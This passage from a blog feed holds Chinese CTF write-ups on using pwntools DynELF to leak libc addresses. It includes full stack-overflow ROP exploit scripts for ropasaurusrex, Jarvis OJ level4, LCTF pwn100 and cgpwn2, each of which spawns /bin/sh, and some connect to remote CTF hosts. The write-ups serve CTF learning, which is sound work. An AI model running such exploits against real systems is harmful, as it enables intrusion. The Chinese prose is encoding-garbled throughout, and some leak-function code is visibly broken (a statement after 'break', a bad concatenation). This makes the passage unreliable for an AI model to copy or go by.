class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">40540</span>)elf = ELF(<span class="hljs-string">'./cgpwn2'</span>)io.recvuntil(<span class="hljs-string">'name\n'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)system_plt = elf.symbols[<span class="hljs-string">'system'</span>]padding = <span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>binsh_add = <span class="hljs-number">0x0804A080</span>payload = padding * <span class="hljs-string">'a'</span> + p32(system_plt) + p32(<span class="hljs-number">0x0804A080</span>) + p32(binsh_add)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯</title>
    <link href="/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/"/>
    <url>/2020/02/15/%E5%88%A9%E7%94%A8DynElf%E6%A8%A1%E5%9D%97%E5%AE%8C%E6%88%90%E8%8E%B7%E5%8F%96libc%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯"><a href="#åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯" class="headerlink" title="åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯"></a>åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹å¦ä¸€ç§æ²¡æœ‰libcï¼Œå®Œæˆæ¼æ´åˆ©ç”¨çš„åŠæ³•ï¼Œå­¦å®Œåè‡ªæˆ‘æ„Ÿè§‰è¿™ä¸ªåŠæ³•å·²ç»æ¯”è¾ƒè½åäº†ï¼Œæ²¡æœ‰libcseacherå¥½ç”¨ï¼Œä¹Ÿç”¨èµ·æ¥æ¯”å®ƒéš¾çš„å¤šäº†ã€‚é’ˆå¯¹äºlibcseacherä¸èƒ½åšçš„é¢˜ï¼Œç”¨è¿™ç§åŠæ³•ï¼Œå¦åˆ™è¿˜æ˜¯libcseacherå¥½ç”¨ã€‚</p><h2 id="Dynelf"><a href="#Dynelf" class="headerlink" title="Dynelf"></a>Dynelf</h2><p>è§£æåŠ è½½çš„ã€åŠ¨æ€é“¾æ¥çš„ELFâ¼†è¿›åˆ¶â½‚ä»¶ä¸­çš„ç¬¦å·ã€‚ç»™å®šâ¼€ä¸ªå¯ä»¥åœ¨ä»»æ„åœ°å€æ³„æ¼æ•°æ®çš„å‡½æ•°ï¼Œä»»ä½•åŠ è½½çš„ åº“ä¸­çš„ä»»ä½•ç¬¦å·éƒ½å¯ä»¥è¢«è§£æã€‚ï¼ˆå®˜æ–¹æ–‡æ¡£è§£é‡Šï¼‰</p><h3 id="åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š"><a href="#åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š" class="headerlink" title="åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š"></a>åŸºæœ¬ä½¿ç”¨æ¡†æ¶ï¼š</h3><div class="hljs"><pre><code>io = remote(ip, port)def leak(addr):    payload = &quot;xxxxxxxx&quot; + addr + &quot;xxxxxxxx&quot;    io.send(payload)    data = io.recv()    #debugç”¨çš„    print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;)))    return data#åˆå§‹åŒ–DynELFæ¨¡å— d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)system_addr = d.lookup(â€œsystemâ€, &apos;libc&apos;)</code></pre></div><p>å…¶ä¸­ç¬¬2ä¸ªå‚æ•°ï¼Œå¯ä»¥ä¸ä¼ ã€‚è¿›è¡Œçš„å·¥ä½œä¸»è¦é›†ä¸­åœ¨leakå‡½æ•°çš„å…·ä½“å®ç°ä¸Šï¼Œä¸Šé¢çš„ä»£ç åªæ˜¯ä¸ªæ¨¡æ¿ã€‚å…¶ä¸­ï¼Œaddrå°±æ˜¯leakå‡½æ•°è¦æ³„æ¼ä¿¡æ¯çš„æ‰€åœ¨åœ°å€ã€‚<strong>æ­£æ˜¯è¿™ä¸ªaddrçš„å‚æ•°çš„å­˜åœ¨ï¼Œæ‰è®©Dynelfå‡½æ•°åœ¨å†…å­˜ä¸­åˆ°å¤„çš„leakä»¥åŠå¯¹æ¯”æ˜¯å¦æ˜¯æˆ‘ä»¬å¯»æ‰¾çš„sympols</strong>ã€‚</p><p>ä¸”ç”±äºDynELFä¼šå¤šæ¬¡è°ƒç”¨leakå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»èƒ½ä»»æ„æ¬¡ä½¿ç”¨ï¼Œå³ä¸èƒ½æ³„éœ²å‡  ä¸ªåœ°å€ä¹‹åå°±å¯¼è‡´ç¨‹åºå´©æºƒã€‚ç”±äºéœ€è¦æ³„éœ²æ•°æ®ï¼Œpayloadä¸­å¿…ç„¶åŒ…å«ç€æ‰“å°å‡½æ•°ï¼Œå¦‚write, puts, printfç­‰ã€‚</p><h3 id="ä½¿ç”¨æ¡ä»¶ï¼š"><a href="#ä½¿ç”¨æ¡ä»¶ï¼š" class="headerlink" title="ä½¿ç”¨æ¡ä»¶ï¼š"></a>ä½¿ç”¨æ¡ä»¶ï¼š</h3><p>ä¸ç®¡æœ‰æ²¡æœ‰libcæ–‡ä»¶ï¼Œè¦æƒ³è·å¾—ç›®æ ‡ç³»ç»Ÿçš„systemå‡½æ•°åœ°å€ï¼Œé¦–å…ˆéƒ½è¦æ±‚ç›®æ ‡äºŒè¿›åˆ¶ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªèƒ½å¤Ÿæ³„æ¼ç›®æ ‡ç³»ç»Ÿå†…å­˜ä¸­libcç©ºé—´å†…ä¿¡æ¯çš„æ¼æ´ã€‚åŒæ—¶ï¼Œç”±äºæˆ‘ä»¬æ˜¯åœ¨å¯¹æ–¹å†…å­˜ä¸­ä¸æ–­æœç´¢åœ°å€ä¿¡æ¯ï¼Œæ•…æˆ‘ä»¬éœ€è¦è¿™æ ·çš„ä¿¡æ¯æ³„éœ²æ¼æ´èƒ½å¤Ÿè¢«åå¤è°ƒç”¨ã€‚ä»¥ä¸‹æ˜¯å¤§è‡´å½’çº³çš„ä¸»è¦ä½¿ç”¨æ¡ä»¶ï¼š</p><ul><li>ç›®æ ‡ç¨‹åºå­˜åœ¨å¯ä»¥æ³„éœ²libcç©ºé—´ä¿¡æ¯çš„æ¼æ´ï¼Œå¦‚read@gotå°±æŒ‡å‘libcåœ°å€ç©ºé—´å†…ï¼›</li><li>ç›®æ ‡ç¨‹åºä¸­å­˜åœ¨çš„ä¿¡æ¯æ³„éœ²æ¼æ´èƒ½å¤Ÿåå¤è§¦å‘ï¼Œä»è€Œå¯ä»¥ä¸æ–­æ³„éœ²libcåœ°å€ç©ºé—´å†…çš„ä¿¡æ¯ã€‚</li></ul><p>ä»¥ä¸Šä»…ä»…æ˜¯å®ç°åˆ©ç”¨çš„åŸºæœ¬æ¡ä»¶ï¼Œä¸åŒçš„ç›®æ ‡ç¨‹åºå’Œè¿è¡Œç¯å¢ƒéƒ½ä¼šæœ‰ä¸€äº›å‘éœ€è¦ç»•è¿‡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸»è¦é’ˆå¯¹writeå’Œputsè¿™ä¸¤ä¸ªæ™®éç”¨æ¥æ³„æ¼ä¿¡æ¯çš„å‡½æ•°åœ¨å®é™…é…åˆDynELFå·¥ä½œæ—¶å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼Œç»™å‡ºç›¸åº”çš„è§£å†³æ–¹æ³•ã€‚</p><h3 id="ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²"><a href="#ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²" class="headerlink" title="ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²"></a>ä½¿ç”¨writeå‡½æ•°æ¥æ³„éœ²</h3><p>writeå‡½æ•°åŸå‹æ˜¯write(fd, addr, len)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€ï¼Œè¯»å–lenå­—èŠ‚çš„æ•°æ®åˆ°æ–‡ä»¶æµfdï¼ˆ0è¡¨ç¤ºæ ‡å‡†è¾“å…¥æµstdinã€1è¡¨ç¤ºæ ‡å‡†è¾“å‡ºæµstdoutï¼‰ã€‚</p><p>å…¶è¾“å‡ºå®Œå…¨ç”±å…¶å‚æ•°lenå†³å®šï¼Œåªè¦ç›®æ ‡åœ°å€å¯è¯»ï¼Œsizeå¡«å¤šå°‘å°±è¾“å‡ºå¤šå°‘ï¼Œä¸ä¼šå—åˆ°è¯¸å¦‚â€˜\0â€™, â€˜\nâ€™ä¹‹ç±»çš„å­—ç¬¦å½±å“ã€‚å› æ­¤leakå‡½æ•°ä¸­å¯¹æ•°æ®çš„è¯»å–å’Œå¤„ç†è¾ƒä¸ºç®€å•ã€‚ä½†æ˜¯å…¶ä¸€ä¸ªä¸å¥½çš„åœ°æ–¹ï¼Œå°±æ˜¯éœ€è¦ä¼ é€’3ä¸ªå‚æ•°ï¼Œåœ¨é¢å¯¹64ä½ç¨‹åºçš„æ—¶å€™ï¼Œå…¶ä¸­rdxè¿™ä¸ªå¯„å­˜å™¨æ˜¯æ¯”è¾ƒéš¾å¤„ç†çš„ã€‚å°±ä¸å¾—ä¸ç”¨ä¸‡èƒ½gadgetäº†ã€‚</p><h4 id="ä¸‡èƒ½gadget"><a href="#ä¸‡èƒ½gadget" class="headerlink" title="ä¸‡èƒ½gadget"></a>ä¸‡èƒ½gadget</h4><p><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817628590359.jpg" srcset="/img/loading.gif" alt="-w817"><br>è¿™ä¸ªæ˜¯libc_initå‡½æ•°çš„æ±‡ç¼–ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸€å®šè¦è°ƒç”¨çš„ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶rdi,rsi,rdx,æ‰€ä»¥èƒ½ç§°çš„ä¸Šä¸‡èƒ½gadgetã€‚å¯¹äºä½¿ç”¨è¿™æ®µgadgetï¼Œé¦–å…ˆåœ¨åˆè¯†å‡½æ•°çš„retå¤„å¡«å…¥å¦‚å›¾æ‰€æŒ‡çš„<code>pop rbx</code>çš„åœ°å€ï¼Œç„¶åçœ‹ä¸‹æ ˆå¦‚ä½•æ¥å¸ƒç½®ï¼š<br><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817631112375.jpg" srcset="/img/loading.gif" alt="-w486"><br>ï¼ˆå…¶ä¸­ä¸ºä»€ä¹ˆå¡«å…¥gotåœ°å€ï¼Œæ˜¯å› ä¸ºæ¥ä¸‹æ¥retåˆ°<code>mov rdx,r13</code>åé¢çš„call qword ptr[r12+rbx*8] å…¶æ˜¯callè¿™ä¸ªåœ°å€çš„ã€‚ï¼‰<br>åœ¨ç¬¬ä¸€æ®µpop åretåœ°å€è¦å¡«å…¥<code>mov rdx,r13</code>çš„åœ°å€ï¼Œç„¶åå†æ…¢æ…¢æ‰§è¡Œï¼Œå½“æ‰§è¡Œå®Œæˆcallä»¥åï¼Œæµç¨‹è¿˜ä¼šå›åˆ°è¿™ä¸€æ®µ<br><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817633402017.jpg" srcset="/img/loading.gif" alt="-w259"><br>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†å†æ¬¡åˆ©ç”¨æœ€åé‚£ä¸ªretnï¼Œretåˆ°è‡ªå·±æƒ³å»çš„åœ°æ–¹ï¼Œè¦åœ¨æ ˆä¸Šæ‘†å¥½7*8=56ä¸ªå­—èŠ‚ã€‚æ¥ä¸‹æ¥ç»ƒä¹ å…³äºwriteä¸¤ä¸ªé¢˜ç›®ã€‚</p><h4 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF 2013 ropasaurusrex"></a>PlaidCTF 2013 ropasaurusrex</h4><h5 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code>Arch:     i386-32-little RELRO:    No RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x8048000)</code></pre></div><h5 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><div class="hljs"><pre><code>ssize_t sub_80483F4(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre></div><p>å‡½æ•°ååˆ†ç®€å•ï¼Œæº¢å‡ºåœ¨è¿™ä¸ªä½ç½®ã€‚å¹¶ä¸”plté‡Œé¢æœ‰writeå‡½æ•°ï¼Œç„¶åå°±ç”¨å®ƒæ¥æ³„éœ²ã€‚</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code>from pwn import *io = process(&apos;./ropasaurusrex&apos;)elf = ELF(&apos;./ropasaurusrex&apos;)buf = 0x8049620padding = 140write_add = elf.symbols[&apos;write&apos;]start_addr = 0x08048340def leak(addr):    p = &apos;&apos;    p += padding * &apos;a&apos;    p += p32(write_add)    p += p32(start_addr)    p += p32(1)    p += p32(addr)    p += p32(0x4)    io.sendline(p)    content = io.recv(4)    # print(&quot;%x -&gt; %s&quot; %(addr, (content or &apos;&apos;).encode(&apos;hex&apos;)))    return contentd = DynELF(leak,elf=elf)system_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)read_add = d.lookup(&apos;read&apos;,&apos;libc&apos;)log.info(&quot;system_add = %x&quot;, system_add)log.info(&quot;read_add = %x&quot;, read_add)p = padding * &apos;a&apos; + p32(read_add) + p32(system_add) + p32(0) + p32(buf) + p32(8)io.sendline(p)io.sendline(&apos;/bin/sh\x00&apos;)io.interactive()</code></pre></div><h4 id="Jarvis-oj-leave4"><a href="#Jarvis-oj-leave4" class="headerlink" title="Jarvis_oj_leave4"></a>Jarvis_oj_leave4</h4><h5 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code>[*] &apos;/media/psf/mypwn2/jarvis_OJ/level4/level4&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre></div><h5 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><p><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817716059093.jpg" srcset="/img/loading.gif" alt="-w420"></p><div class="hljs"><pre><code>ssize_t vulnerable_function(){  char buf; // [esp+0h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre></div><p>æ¼æ´å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚è¿˜æ˜¯è·Ÿä¸Šé¢˜ä¸€æ ·çš„æ€è·¯ã€‚</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code>from pwn import *import time# context.log_level = &apos;debug&apos;context.arch = &apos;i386&apos;# io = process(&apos;./level4&apos;)io = remote(&apos;pwn2.jarvisoj.com&apos;,9880)elf = ELF(&apos;./level4&apos;)__libc_start_main_got = elf.got[&apos;__libc_start_main&apos;]write_plt = elf.symbols[&apos;write&apos;]start_addr = 0x08048350padding = 140def leak(addr):    payload = padding * &apos;a&apos; + p32(write_plt) + p32(start_addr) + p32(1) + p32(addr) +p32(0x4)    io.sendline(payload)    data = io.recv(4)    print(&quot;%x -&gt; %s&quot; %(addr, (data or &apos;&apos;).encode(&apos;hex&apos;)))    return datad = DynELF(leak,elf = elf)system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)info(&apos;system_addr = %#x&apos; %system_addr)read_addr = d.lookup(&apos;read&apos;,&apos;libc&apos;)info(&apos;read_addr = %#x&apos; %read_addr)binsh_add = 0x804A01Cpayload = padding * &apos;a&apos; + p32(read_addr) + p32(system_addr) + p32(0) + p32(binsh_add) + p32(8)io.sendline(payload)sleep(0.1)io.sendline(&apos;/bin/sh\x00&apos;)io.interactive()</code></pre></div><h3 id="ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²"><a href="#ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²" class="headerlink" title="ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²"></a>ä½¿ç”¨putså‡½æ•°æ¥æ³„éœ²</h3><p>printf, putsè¿™ç±»å‡½æ•°çš„ç‰¹ç‚¹æ˜¯ä¼šè¢«ç‰¹æ®Šå­—ç¬¦å½±å“ï¼Œputsçš„åŸå‹æ˜¯puts(addr)ï¼Œå³å°†addrä½œä¸ºèµ·å§‹åœ°å€è¾“å‡ºå­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ°â€œx00â€å­—ç¬¦ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>putså‡½æ•°è¾“å‡ºçš„æ•°æ®é•¿åº¦æ˜¯ä¸å—æ§çš„ï¼Œåªè¦æˆ‘ä»¬è¾“å‡ºçš„ä¿¡æ¯ä¸­åŒ…å«x00æˆªæ–­ç¬¦ï¼Œè¾“å‡ºå°±ä¼šç»ˆæ­¢ï¼Œä¸”ä¼šè‡ªåŠ¨å°†â€œnâ€è¿½åŠ åˆ°è¾“å‡ºå­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ˜¯putså‡½æ•°çš„ç¼ºç‚¹</strong>ï¼Œè€Œä¼˜ç‚¹å°±æ˜¯éœ€è¦çš„å‚æ•°å°‘ï¼Œåªæœ‰1ä¸ªï¼Œæ— è®ºåœ¨x32è¿˜æ˜¯x64ç¯å¢ƒä¸‹ï¼Œéƒ½å®¹æ˜“è°ƒç”¨ã€‚</p><h4 id="é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•"><a href="#é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•" class="headerlink" title="é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•"></a>é’ˆå¯¹ç¼ºç‚¹çš„æ”¹è¿›åŠæ³•</h4><h5 id="putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º"><a href="#putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º" class="headerlink" title="putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º"></a>putsè¾“å‡ºå®Œåå°±æ²¡æœ‰å…¶ä»–è¾“å‡º</h5><p>leakå‡½æ•°æ¨¡æ¿<br>    def leak(address):<br>      count = 0<br>      content = â€˜â€™<br>      payload = xxx<br>      p.send(payload)<br>      print p.recvuntil(â€˜xxxnâ€™) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º<br>      up = â€œâ€<br>      while True:<br>        c = p.recv(numb=1, timeout=0.1)<br>        count += 1<br>        if up == â€˜\nâ€™ and c == â€œâ€:  #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™<br>         content += content[:-1]  +â€™\x00â€™            #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦<br>          break<br>        else:<br>          content += c<br>        up = c<br>      content = content[:4]  #å–æŒ‡å®šå­—èŠ‚æ•°<br>      log.info(â€œ%#x =&gt; %sâ€ % (address, (content or â€˜â€™).encode(â€˜hexâ€™)))<br>      return content<br>å…¶ä¸­<code>c = p.recv(numb=1, timeout=0.1)</code>ç”±äºæ¥æ”¶å®Œæ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦åï¼Œå°±æ²¡æœ‰å…¶ä»–è¾“å‡ºäº†ï¼Œæ•…å…ˆç­‰å¾…0.1ç§’é’Ÿï¼Œå¦‚æœç¡®å®æ¥æ”¶ä¸åˆ°äº†ï¼Œå°±è¯´æ˜è¾“å‡ºç»“æŸäº†ã€‚ä»¥ä¾¿ä¸ä¸æ˜¯æ ‡å¿—å­—ç¬¦ä¸²ç»“æŸçš„å›è½¦ç¬¦ï¼ˆ0x0Aï¼‰æ··æ·†ï¼Œè¿™ä¹Ÿåˆ©ç”¨äº†recvå‡½æ•°çš„timeoutå‚æ•°ï¼Œå³å½“timeoutç»“æŸåä»å¾—ä¸åˆ°è¾“å‡ºï¼Œåˆ™ç›´æ¥è¿”å›ç©ºå­—ç¬¦ä¸²â€â€</p><h5 id="putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º"><a href="#putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º" class="headerlink" title="putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º"></a>putsè¾“å‡ºå®Œåè¿˜æœ‰å…¶ä»–è¾“å‡º</h5><div class="hljs"><pre><code>def leak(address):  count = 0  content = &quot;&quot;  payload = xxx  p.send(payload)  print p.recvuntil(&quot;xxxn&quot;)) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º  up = &quot;&quot;  while True:    c = p.recv(1)    count += 1    if up == &apos;\n&apos; and c == &quot;x&quot;:  #ä¸€å®šè¦æ‰¾åˆ°æ³„æ¼ä¿¡æ¯çš„å­—ç¬¦ä¸²ç‰¹å¾      content = content[:-1] + &quot;x00&quot;                        break    else:      content += c    up = c  content = content[:4]   log.info(&quot;%#x =&gt; %s&quot; % (address, (content or &apos;&apos;).encode(&apos;hex&apos;)))  return content</code></pre></div><h4 id="Lctf-2016-pwn100"><a href="#Lctf-2016-pwn100" class="headerlink" title="Lctf_2016_pwn100"></a>Lctf_2016_pwn100</h4><h5 id="æŸ¥ä¿æŠ¤å’Œarch-2"><a href="#æŸ¥ä¿æŠ¤å’Œarch-2" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code>[*] &apos;/media/psf/mypwn2/ichunqiu/0x05/LCTF 2016-pwn100/pwn100&apos;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre></div><h5 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><div class="hljs"><pre><code>int sub_40068E(){  char v1; // [rsp+0h] [rbp-40h]  sub_40063D((__int64)&amp;v1, 200);  return puts(&quot;bye~&quot;);}__int64 __fastcall sub_40063D(__int64 a1, signed int a2){  __int64 result; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    result = (unsigned int)i;    if ( i &gt;= a2 )      break;    read(0, (void *)(i + a1), 1uLL);  }  return result;}</code></pre></div><p>ä¸»è¦çš„æ¼æ´å‡½æ•°åœ¨è¿™ä¸¤ä¸ªã€‚è¿™äºŒä¸ªå‡½æ•°ç»“åˆèµ·æ¥å¼•èµ·æ ˆæº¢å‡ºï¼Œç¬¬äºŒä¸ªå‡½æ•°è¿˜å¯¹è¯»å…¥æ•°æ®åšäº†å¤„ç†ï¼Œæˆ‘ä»¬è¦ä¿è¯é€è¿‡å»200çš„ä¸ªè‡ªå·±ï¼Œæ³¨æ„è¦ç”¨sendå‘ã€‚</p><ol><li>å› ä¸ºå…¶æœ‰putså‡½æ•°ï¼Œè¿™æ¬¡å°±ç”¨putså‡½æ•°æ¥è¿›è¡Œleakã€‚ç­‰leakå‡ºæ¥ä»¥åï¼Œè¿”å›startæ¸…ç†æ ˆï¼Œå†ç”¨dynelfæ‰¾å‡ºsystemï¼Œå’Œreadå‡½æ•°çš„åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡æ„é€ ropé“¾çš„æ—¶å€™ï¼Œç”¨readå‡½æ•°è¯»<code>system(/bin/sh)</code>åˆ°ä¸€ä¸ªç¡®å®šçš„åœ°å€ï¼Œè¿˜æ˜¯ä¼šåˆ°startå¤„ã€‚</li><li>ç¬¬ä¸‰æ¬¡æ„é€ æ—¶å€™ï¼Œç›´æ¥è¿›è¡Œè°ƒç”¨systemå‡½æ•°çš„ropé“¾å³å¯ã€‚</li></ol><p>å…¶ä¸­å¯¹äºreadè¿™ä¸ªå‡½æ•°ï¼Œrdxè¿™ä¸ªå‚æ•°å°±å¾—ç”¨ä¸‡èƒ½gadgetæ¥æ§åˆ¶äº†ã€‚<br><img src="/2020/02/15/åˆ©ç”¨DynElfæ¨¡å—å®Œæˆè·å–libcä¿¡æ¯/images/15817725422726.jpg" srcset="/img/loading.gif" alt="-w820"></p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code>#coding:utf-8from pwn import *context.arch = &apos;amd64&apos;# context.log_level = &apos;info&apos;io = process(&apos;./pwn100&apos;)elf = ELF(&apos;./pwn100&apos;)# libc = elf.libcpadding = 72puts_plt = elf.plt[&apos;puts&apos;]read_got = elf.got[&apos;read&apos;]start_add = 0x000400550pop_rdi = 0x400763def leak(addr):    payload = padding * &apos;a&apos; + p64(pop_rdi) + p64(addr) + p64(puts_plt) + p64(start_add)#flat[(pop_rdi,addr,puts_plt,start_add)]    payload = payload.ljust(200,&apos;b&apos;)    io.send(payload)    count = 0    up = &apos;&apos;    content = &apos;&apos;    io.recvuntil(&apos;bye~\n&apos;) #ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º    while True:        c = io.recv(numb=1, timeout=0.1)        count += 1        if up == &apos;\n&apos; and c == &quot;&quot;:  #æ¥æ”¶åˆ°çš„ä¸Šä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦ç¬¦ï¼Œè€Œå½“å‰æ¥æ”¶ä¸åˆ°æ–°å­—ç¬¦ï¼Œåˆ™            content = content[:-1]  +&apos;\x00&apos;             #åˆ é™¤putså‡½æ•°è¾“å‡ºçš„æœ«å°¾å›è½¦ç¬¦            break            content += c        else:            up = c    content = content[:4]  #å–æŒ‡å®šå­—èŠ‚æ•°    log.info(&quot;%#x =&gt; %s&quot; % (addr, (content or &apos;&apos;).encode(&apos;hex&apos;)))    return contentd = DynELF(leak, elf = elf)system_addr = d.lookup(&apos;system&apos;,&apos;libc&apos;)log.info(&apos;system_addr = %#x&apos; %system_addr)binsh_addr = 0x601068 - 8payload = padding * &apos;a&apos; + flat([0x0040075A,0,1,read_got,8,binsh_addr,0,0x00400740,&apos;\x00&apos;*56,start_add])payload = payload.ljust(200,&apos;b&apos;)io.send(payload)io.recvuntil(&apos;bye~\n&apos;)io.send(&apos;/bin/sh\x00&apos;)payload = padding * &apos;a&apos; + flat([pop_rdi,binsh_addr,system_addr])payload = payload.ljust(200,&apos;b&apos;)io.send(payload)io.interactive()</code></pre></div><h3 id="å…¶ä»–è·å–libcçš„æ–¹æ³•"><a href="#å…¶ä»–è·å–libcçš„æ–¹æ³•" class="headerlink" title="å…¶ä»–è·å–libcçš„æ–¹æ³•"></a>å…¶ä»–è·å–libcçš„æ–¹æ³•</h3><p>è™½ç„¶DynELFæ˜¯ä¸€ä¸ªdumpåˆ©å™¨ï¼Œä½†æ˜¯å¦‚æœå†™ä¸å‡ºæ¥leakå‡½æ•°ï¼Œä¸‹libcè¢«å¢™ç­‰ç­‰ã€‚å°±ç”¨è¿™ä¸¤ä¸ªç½‘ç«™ï¼š<br><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br><a href="https://libc.blukat.me/" target="_blank" 